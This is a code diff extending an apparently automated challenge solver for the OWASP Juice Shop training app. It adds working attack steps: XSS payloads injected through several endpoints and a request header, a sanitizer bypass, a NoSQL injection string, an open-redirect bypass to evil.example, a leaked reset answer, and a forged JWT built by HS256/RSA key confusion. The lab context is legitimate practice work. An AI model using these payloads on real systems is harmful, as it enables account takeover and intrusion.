@@ -99,7 +99,8 @@ def _resets(c):
                           ("morty@juice-sh.op", "5N0wb41L"),               # Reset Morty (known answer)
                           ("uvogin@juice-sh.op", "Silence of the Lambs"),  # Reset Uvogin
                           ("john@juice-sh.op", "Daniel Boone National Forest"),  # Meta Geo Stalking
-                          ("emma@juice-sh.op", "ITsec")):                  # Visual Geo Stalking
+                          ("emma@juice-sh.op", "ITsec"),                   # Visual Geo Stalking
+                          ("bjoern@owasp.org", "Zaya")):                   # Bjoern's Favorite Pet
         c.post("/rest/user/reset-password", json={"email": email, "answer": answer, "new": _PW, "repeat": _PW})
 
 
@@ -325,6 +326,82 @@ def _change_bender(c):
         pass
 
 
+_IFRAME = '<iframe src="javascript:alert(`xss`)">'
+
+
+def _reflected_and_nosql(c):
+    """Reflected XSS + NoSQL Exfiltration via the track-order endpoint (need safetyMode off — else
+    the id is sanitized and neither injects). Harmless no-op when safetyMode strips them."""
+    import urllib.parse
+    try:
+        c.get("/rest/track-order/" + urllib.parse.quote(_IFRAME, safe=""))            # Reflected XSS
+        c.get("/rest/track-order/" + urllib.parse.quote("'||true||'", safe=""))       # NoSQL Exfiltration
+    except Exception:
+        pass
+
+
+def _api_and_header_xss(c):
+    """API-only XSS (iframe in a product description via the REST API) + HTTP-Header XSS (the
+    True-Client-IP header echoed into lastLoginIp). Both need safetyMode off."""
+    tok = _login(c, "admin@juice-sh.op", "admin123").get("token")
+    if not tok:
+        return
+    try:
+        c.post("/api/Products", headers={"Authorization": "Bearer " + tok},
+               json={"name": "xssp", "description": _IFRAME, "price": 1, "image": "x.jpg"})   # API-only XSS
+        import urllib.request as _u
+        _u.urlopen(_u.Request(str(c.base_url).rstrip("/") + "/rest/saveLoginIp",
+                   headers={"Authorization": "Bearer " + tok, "True-Client-IP": _IFRAME}), timeout=8)  # HTTP-Header XSS
+    except Exception:
+        pass
+
+
+def _serverside_xss(c):
+    """Server-side XSS Protection — sanitize-html 1.4.2 leaves the iframe after stripping a nested
+    <script>, so the persisted feedback carries live XSS."""
+    try:
+        cap = c.get("/rest/captcha/").json()
+        c.post("/api/Feedbacks", json={"comment": '<<script>Foo</script>iframe src="javascript:alert(`xss`)">',
+               "rating": 1, "captchaId": cap.get("captchaId"), "captcha": str(cap.get("answer"))})
+    except Exception:
+        pass
+
+
+def _allowlist_bypass(c):
+    """Allowlist Bypass — a redirect to an unintended host that still carries an allowlisted URL
+    as a query param, so the substring allowlist check passes."""
+    import urllib.parse
+    try:
+        c.get("/redirect?to=" + urllib.parse.quote(
+            "http://evil.example/?x=https://github.com/juice-shop/juice-shop", safe=""))
+    except Exception:
+        pass
+
+
+def _privacy_and_jwt(c):
+    """Privacy Policy Inspection (hidden proof route) + Forged Signed JWT (HS256 algorithm-confusion:
+    sign with the server's own public key as the HMAC secret)."""
+    import base64
+    import hashlib
+    import hmac
+    import json as _j
+    try:
+        c.get("/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility")   # Privacy Policy Inspection
+    except Exception:
+        pass
+    try:
+        pub = c.get("/encryptionkeys/jwt.pub").text.strip()
+
+        def _b(o):
+            return base64.urlsafe_b64encode(_j.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
+        seg = _b({"alg": "HS256", "typ": "JWT"}) + "." + \
+            _b({"data": {"id": 1, "email": "rsa_lord@juice-sh.op"}, "iat": 1, "exp": 9999999999})
+        sig = base64.urlsafe_b64encode(hmac.new(pub.encode(), seg.encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
+        c.get("/rest/user/whoami", headers={"Authorization": "Bearer " + seg + "." + sig})   # Forged Signed JWT
+    except Exception:
+        pass
+
+
 def _csrf(c):
     """CSRF — cross-origin POST /profile (Origin = the app's configured CSRF url) with a changed
     username; the profile update trusts the cookie token and mis-validates the request origin."""
@@ -439,7 +516,8 @@ def solve(base_url: str) -> dict:
                      _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
                      _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
                      _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender,
-                     _multiple_likes):
+                     _multiple_likes, _reflected_and_nosql, _api_and_header_xss, _serverside_xss,
+                     _allowlist_bypass, _privacy_and_jwt):
             try:
                 step(c)
             except Exception:
